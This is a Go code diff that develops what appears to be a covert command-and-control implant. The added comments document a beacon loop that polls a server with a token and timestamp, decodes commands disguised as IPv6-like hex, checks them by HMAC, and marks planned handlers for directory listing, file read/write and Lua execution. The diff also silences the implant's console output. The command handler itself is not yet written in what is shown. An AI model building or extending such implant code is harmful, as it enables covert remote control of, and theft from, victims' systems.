@@ -13,11 +13,18 @@ import (
 )
 
 // Struct to hold the response format from the server
+// The key is the HMAC used to verify the data retrieved using a shared secret
 type ResponseData struct {
 	Message string `json:"message"`
 	Key     string `json:"key"`
 }
 
+// makeGetRequest makes a GET request to the given URL
+// It takes in 3 parameters
+// 1) The base URL to make the request to
+// 2) The maximum number of retries before giving up
+// 3) The query parameters to include in the request
+// It returns the response and any error that occurred
 func makeGetRequest(baseUrl string, maxRetries int, params url.Values) (*http.Response, error) {
 	var resp *http.Response
 	var err error
@@ -32,7 +39,8 @@ func makeGetRequest(baseUrl string, maxRetries int, params url.Values) (*http.Re
 		}
 
 		// Log the error and retry after a delay
-		fmt.Printf("Error making GET request (attempt %d/%d): %v\n", attempts+1, maxRetries, err)
+		//fmt.Printf("Error making GET request (attempt %d/%d): %v\n", attempts+1, maxRetries, err)
+		attempts++
 		time.Sleep(10 * time.Second)
 	}
 
@@ -40,6 +48,7 @@ func makeGetRequest(baseUrl string, maxRetries int, params url.Values) (*http.Re
 	return nil, fmt.Errorf("failed to fetch URL after %d attempts: %w", maxRetries, err)
 }
 
+// The 4 byte ID for the implant to use set at compile time
 var CompUUID string
 
 func main() {
@@ -60,10 +69,14 @@ func main() {
 
 		//reqURL, _ := url.Parse(baseUrl)
 
-		// Add params to the query (The auth token and time)
+		// Prepare the hmac params (timestamp and token)
 		params := url.Values{}
 		hardVals := fmt.Sprintf("timestamp=%s&token=%s", timestamp, token)
 
+		// compedData is hardVals compressed using zlib
+		// if enabled at compile time, DoComp returns the compressed object and bool true
+		// if disabled (default) the function returns false
+		// if false, the params are instead appended to the request uncompressed
 		compedData, boolRes := shared.DoComp(hardVals)
 		if boolRes {
 			params.Add(string(compedData.String()), "")
@@ -74,12 +87,16 @@ func main() {
 			//fmt.Println(reqURL.String())
 		}
 
+		// makeGetRequest 3 times with a 10 second delay between each attempt
+		// if the request is successful, break the loop
+		// otherwise, the 3 timeouts cause the program to exit
 		resp, err := makeGetRequest(baseUrl, maxRetries, params)
 		if err != nil {
 			fmt.Println("Final error:", err)
 			return
 		}
 
+		// Defer closing the response body until the for loop breaks
 		defer resp.Body.Close()
 
 		// Check the response status
@@ -104,15 +121,24 @@ func main() {
 		}
 
 		// Print the values (for testing)
-		fmt.Println("Message:", data.Message)
-		fmt.Println("Key:", data.Key)
+		// fmt.Println("Message:", data.Message)
+		// fmt.Println("Key:", data.Key)
 
-		decoded, _ := shared.DecodeIPv6ToString(string(data.Message))
+		// The response comes encoded in a hex format that mimics IPv6 IPs
+		// Decode that data
+		decoded, err := shared.DecodeIPv6ToString(string(data.Message))
+		if err != nil {
+			fmt.Println(err)
+			break
+		}
 		fmt.Println("Decoded string:", decoded)
 
 		// Verify the message with the received HMAC
 		if shared.VerifyMessageWithHMAC(data.Message, data.Key, []byte(conf.Psk1)) {
 			fmt.Println("HMAC is valid!")
+			// Here is where command processing should occur
+			// A switch statement to run through possible command options, including using the lua engine
+			// List arbitrary dir, read file, write file, execute Lua
 			break
 		} else {
 			fmt.Println("HMAC is invalid or message was tampered with.")
